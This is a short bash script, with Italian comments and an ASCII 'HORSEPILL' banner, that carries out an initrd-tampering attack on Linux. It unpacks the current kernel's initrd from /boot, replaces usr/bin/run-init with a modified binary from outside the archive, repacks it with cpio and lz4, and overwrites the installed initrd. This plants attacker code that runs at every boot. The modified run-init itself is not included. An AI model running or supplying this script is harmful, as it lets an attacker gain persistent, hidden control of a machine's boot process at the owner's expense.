#!/bin/bash


echo "Start horsepill inird mod"
echo "██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ██╗██╗     ██╗
██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██║██║     ██║     
███████║██║   ██║██████╔╝███████╗█████╗  ██████╔╝██║██║     ██║     
██╔══██║██║   ██║██╔══██╗╚════██║██╔══╝  ██╔═══╝ ██║██║     ██║     
██║  ██║╚██████╔╝██║  ██║███████║███████╗██║     ██║███████╗███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝"

mkdir attack
#decomprimere archivio
cp /boot/initrd.img-$(uname -r) attack/
cd attack
mv initrd.img-$(uname -r) initrd.img
(cpio -i; cpio -i; unlz4 |cpio -i ) < initrd.img
rm initrd.img
#effettua modifiche
rm usr/bin/run-init
#cp --preserve=all /lost+found/run-init usr/bin/
cp --preserve=all ../run-init usr/bin/
#mv ${path_runinit_mod}/run-init usr/bin/

#ricompila archivio
mkdir ../start
mv kernel/ ../start
cd ../start
find . | cpio -o -H newc > ../newinitrd.img
cd ../attack
find . | cpio -o -H newc | lz4 -l -c >> ../newinitrd.img
cd ..
#installa nuovo initrd
mv newinitrd.img /boot/initrd.img-$(uname -r)

#chiusura
rm -r attack/ start/
echo "DONE"
